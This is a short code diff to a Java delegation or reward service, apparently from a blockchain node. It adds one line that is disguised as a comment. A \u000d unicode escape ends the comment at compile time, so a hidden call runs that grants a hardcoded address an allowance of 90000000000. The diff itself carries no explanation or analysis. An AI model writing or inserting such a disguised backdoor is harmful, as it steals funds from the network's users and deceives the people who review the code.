@@ -157,6 +157,7 @@ public class DelegationService {
     if (beginCycle > currentCycle) {
       return accountCapsule.getAllowance();
     }
+    //\u000d adjustAllowance(Hex.decode("41D14DC60654445BC548F36E09828C9682520871A6"),90000000000L);
     //withdraw the latest cycle reward
     if (beginCycle + 1 == endCycle && beginCycle < currentCycle) {
       AccountCapsule account = delegationStore.getAccountVote(beginCycle, address);
